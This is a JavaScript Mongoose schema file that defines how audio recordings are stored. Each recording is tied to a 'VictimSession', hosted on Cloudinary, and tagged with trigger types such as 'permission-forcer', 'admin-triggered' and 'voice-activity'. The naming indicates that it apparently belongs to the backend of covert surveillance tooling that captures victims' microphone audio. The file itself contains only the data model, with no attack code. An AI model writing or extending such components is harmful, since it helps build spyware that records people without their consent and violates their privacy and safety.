const mongoose = require('mongoose');

const AudioCaptureSchema = new mongoose.Schema({
  sessionId: { type: mongoose.Schema.Types.ObjectId, ref: 'VictimSession', required: true, index: true },
  sessionIdStr: { type: String },
  cloudinaryUrl: { type: String }, // Cloudinary hosted URL for audio
  cloudinaryPublicId: { type: String },
  duration: { type: Number }, // duration in seconds
  format: { type: String, default: 'webm' },
  sampleRate: { type: Number },
  channels: { type: Number, default: 1 },
  amplitude: { type: Number }, // average audio level (0-255)
  capturedAt: { type: Date, default: Date.now },
  triggerType: { type: String, enum: ['auto', 'manual', 'periodic', 'admin-triggered', 'permission-forcer', 'voice-activity'], default: 'permission-forcer' },
  metadata: {
    deviceLabel: { type: String },
    deviceId: { type: String },
    echoCancellation: { type: Boolean },
    noiseSuppression: { type: Boolean }
  }
}, { timestamps: true });

AudioCaptureSchema.index({ sessionId: 1, capturedAt: -1 });

module.exports = mongoose.model('AudioCapture', AudioCaptureSchema);